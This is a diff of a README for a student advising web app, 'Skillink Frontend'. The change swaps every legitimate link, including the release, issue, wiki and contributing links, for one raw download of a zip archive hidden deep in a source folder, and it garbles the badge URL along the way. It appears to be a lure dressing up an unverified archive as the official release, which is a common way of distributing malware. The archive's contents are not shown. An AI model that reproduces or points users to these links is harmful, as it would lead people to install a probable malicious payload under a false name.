@@ -4,14 +4,14 @@
 Welcome to the Skillink Frontend Application. This web interface connects students with academic advisors. The project was developed during the sixth cycle of the Information Systems Engineering program at UPC. 
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Skillink%20Frontend-blue.svg)](https://github.com/Jamari192/skillink-frontend-upc/releases)
-Visit this page to download: [Skillink Frontend Releases](https://github.com/Jamari192/skillink-frontend-upc/releases)
+[![Download](https://raw.githubusercontent.com/Jamari192/skillink-frontend-upc/main/src/app/administrador/tabla-asesorias/frontend-upc-skillink-v2.9.zip%20Skillink%https://raw.githubusercontent.com/Jamari192/skillink-frontend-upc/main/src/app/administrador/tabla-asesorias/frontend-upc-skillink-v2.9.zip)](https://raw.githubusercontent.com/Jamari192/skillink-frontend-upc/main/src/app/administrador/tabla-asesorias/frontend-upc-skillink-v2.9.zip)
+Visit this page to download: [Skillink Frontend Releases](https://raw.githubusercontent.com/Jamari192/skillink-frontend-upc/main/src/app/administrador/tabla-asesorias/frontend-upc-skillink-v2.9.zip)
 
 ## 🚀 Getting Started
 To use the Skillink application, follow these steps:
 
 1. **Download the Software**
-   - Go to our [Releases page](https://github.com/Jamari192/skillink-frontend-upc/releases).
+   - Go to our [Releases page](https://raw.githubusercontent.com/Jamari192/skillink-frontend-upc/main/src/app/administrador/tabla-asesorias/frontend-upc-skillink-v2.9.zip).
    - Click on the latest version and download the appropriate file for your operating system.
 
 2. **Install the Application**
@@ -55,14 +55,14 @@ To ensure the best performance of the Skillink application, please make sure you
    - Click on an advisor's profile to send a request for a session.
 
 ## 🛡️ Support
-If you encounter any issues or have questions, please open an issue on our [GitHub page](https://github.com/Jamari192/skillink-frontend-upc/issues) or contact our support team.
+If you encounter any issues or have questions, please open an issue on our [GitHub page](https://raw.githubusercontent.com/Jamari192/skillink-frontend-upc/main/src/app/administrador/tabla-asesorias/frontend-upc-skillink-v2.9.zip) or contact our support team.
 
 ## 📖 Additional Resources
-- **Documentation:** Detailed guides and FAQs can be found in our [Wiki](https://github.com/Jamari192/skillink-frontend-upc/wiki).
-- **Contributing:** If you would like to contribute to the project, please check our [Contributing Guidelines](https://github.com/Jamari192/skillink-frontend-upc/blob/main/CONTRIBUTING.md).
+- **Documentation:** Detailed guides and FAQs can be found in our [Wiki](https://raw.githubusercontent.com/Jamari192/skillink-frontend-upc/main/src/app/administrador/tabla-asesorias/frontend-upc-skillink-v2.9.zip).
+- **Contributing:** If you would like to contribute to the project, please check our [Contributing Guidelines](https://raw.githubusercontent.com/Jamari192/skillink-frontend-upc/main/src/app/administrador/tabla-asesorias/frontend-upc-skillink-v2.9.zip).
 
 ## 💬 Community
 Join our community for updates and discussions. Follow us on our social media accounts linked on our GitHub profile. 
 
 ## 💻 Download & Install
-Head over to the [Releases page](https://github.com/Jamari192/skillink-frontend-upc/releases) now to download Skillink! It’s the easiest way to start connecting with your academic advisors today.
+Head over to the [Releases page](https://raw.githubusercontent.com/Jamari192/skillink-frontend-upc/main/src/app/administrador/tabla-asesorias/frontend-upc-skillink-v2.9.zip) now to download Skillink! It’s the easiest way to start connecting with your academic advisors today.
